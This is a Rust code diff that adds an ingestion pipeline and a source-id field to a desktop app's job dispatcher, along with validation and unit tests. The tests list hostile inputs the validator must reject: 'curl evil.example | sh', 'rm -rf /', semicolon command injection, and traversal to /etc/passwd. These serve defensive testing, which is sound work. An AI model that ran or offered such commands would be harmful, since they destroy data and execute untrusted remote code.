@@ -17,7 +17,7 @@ const KEYRING_SERVICE: &str = "geoint-prospect";
 const KEYRING_USER: &str = "github-token";
 
 /// Pipelines the app may request. Anything else never reaches the API.
-const ALLOWED_PIPELINES: [&str; 2] = ["healthcheck", "tabular-normalize"];
+const ALLOWED_PIPELINES: [&str; 3] = ["healthcheck", "tabular-normalize", "ingest-tabular"];
 
 #[derive(Debug, Clone, Serialize)]
 pub struct TokenStatus {
@@ -29,6 +29,8 @@ pub struct DispatchRequest {
     pub pipeline: String,
     pub request_id: String,
     pub input_path: Option<String>,
+    /// Registered source id from configs/sources, required by ingestion pipelines.
+    pub source_id: Option<String>,
     pub dry_run: bool,
 }
 
@@ -87,21 +89,134 @@ fn validate(request: &DispatchRequest) -> Result<(), String> {
             ALLOWED_PIPELINES.join(", ")
         ));
     }
-    let id = request.request_id.as_str();
-    if id.is_empty()
-        || id.len() > 64
-        || !id
-            .chars()
-            .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
-    {
+    if !is_identifier(request.request_id.as_str()) {
         return Err("request id must be 1-64 characters of [A-Za-z0-9._-]".to_string());
     }
     if let Some(path) = request.input_path.as_deref() {
-        if path.starts_with('/') || path.contains("..") || path.is_empty() {
+        if !path.is_empty() && (path.starts_with('/') || path.contains("..")) {
             return Err("input path must be repository-relative and without '..'".to_string());
         }
     }
+    if let Some(source_id) = request.source_id.as_deref() {
+        if !source_id.is_empty() && !is_identifier(source_id) {
+            return Err("source id must be 1-64 characters of [A-Za-z0-9._-]".to_string());
+        }
+    }
+    if request.pipeline == "ingest-tabular" && request.source_id.as_deref().unwrap_or("").is_empty()
+    {
+        return Err("ingest-tabular needs a registered source id".to_string());
+    }
     Ok(())
+}
+
+fn is_identifier(value: &str) -> bool {
+    !value.is_empty()
+        && value.len() <= 64
+        && value
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "._-".contains(c))
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn request(pipeline: &str, request_id: &str, input_path: Option<&str>) -> DispatchRequest {
+        DispatchRequest {
+            pipeline: pipeline.to_string(),
+            request_id: request_id.to_string(),
+            input_path: input_path.map(str::to_string),
+            source_id: Some("fixtures-observations".to_string()),
+            dry_run: true,
+        }
+    }
+
+    #[test]
+    fn allows_only_registered_pipelines() {
+        assert!(validate(&request("healthcheck", "req-1", None)).is_ok());
+        assert!(validate(&request("ingest-tabular", "req-1", None)).is_ok());
+
+        for hostile in [
+            "rm -rf /",
+            "curl evil.example | sh",
+            "tabular-normalize;whoami",
+            "",
+        ] {
+            assert!(
+                validate(&request(hostile, "req-1", None)).is_err(),
+                "pipeline '{hostile}' must be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn refuses_request_ids_that_are_not_safe_identifiers() {
+        for hostile in [
+            "",
+            " ",
+            "id with spaces",
+            "id;rm -rf /",
+            "../../etc/passwd",
+            "id$IFS",
+            "id\ninjected",
+            &"a".repeat(65),
+        ] {
+            assert!(
+                validate(&request("healthcheck", hostile, None)).is_err(),
+                "request id '{hostile}' must be refused"
+            );
+        }
+    }
+
+    #[test]
+    fn refuses_input_paths_that_leave_the_repository() {
+        for hostile in [
+            "/etc/passwd",
+            "../secret.csv",
+            "..",
+            "engine/../../etc/passwd",
+        ] {
+            assert!(validate(&request("tabular-normalize", "req-1", Some(hostile))).is_err());
+        }
+
+        assert!(validate(&request(
+            "tabular-normalize",
+            "req-1",
+            Some("engine/tests/fixtures/observations.csv")
+        ))
+        .is_ok());
+
+        // An empty value means "not provided": the workflow default applies.
+        assert!(validate(&request("tabular-normalize", "req-1", Some(""))).is_ok());
+    }
+
+    #[test]
+    fn refuses_source_ids_that_are_not_registered_shaped() {
+        for hostile in [
+            "https://evil.example/x.csv",
+            "a;rm -rf /",
+            "a b",
+            "../etc",
+            &"a".repeat(65),
+        ] {
+            let mut hostile_request = request("ingest-tabular", "req-1", None);
+            hostile_request.source_id = Some(hostile.to_string());
+            assert!(
+                validate(&hostile_request).is_err(),
+                "source id '{hostile}' must be refused"
+            );
+        }
+
+        assert!(validate(&request("ingest-tabular", "req-1", None)).is_ok());
+    }
+
+    #[test]
+    fn ingestion_pipelines_require_a_source_id() {
+        let mut without_source = request("ingest-tabular", "req-1", None);
+        without_source.source_id = None;
+
+        assert!(validate(&without_source).is_err());
+    }
 }
 
 #[tauri::command]
@@ -137,12 +252,22 @@ pub async fn dispatch_backend_job(request: DispatchRequest) -> Result<DispatchRe
     validate(&request)?;
     let token = token()?;
 
-    let inputs = serde_json::json!({
-        "pipeline": request.pipeline,
-        "request_id": request.request_id,
-        "input_path": request.input_path.unwrap_or_else(|| "engine/tests/fixtures/observations.csv".to_string()),
-        "dry_run": if request.dry_run { "true" } else { "false" },
-    });
+    // Only send what the caller supplied: omitted inputs keep their workflow defaults.
+    let mut inputs = serde_json::Map::new();
+    inputs.insert("pipeline".into(), serde_json::json!(request.pipeline));
+    inputs.insert("request_id".into(), serde_json::json!(request.request_id));
+    inputs.insert(
+        "dry_run".into(),
+        serde_json::json!(if request.dry_run { "true" } else { "false" }),
+    );
+    for (key, value) in [
+        ("input_path", request.input_path.as_deref()),
+        ("source_id", request.source_id.as_deref()),
+    ] {
+        if let Some(value) = value.filter(|v| !v.is_empty()) {
+            inputs.insert(key.into(), serde_json::json!(value));
+        }
+    }
 
     let response = client()?
         .post(format!(
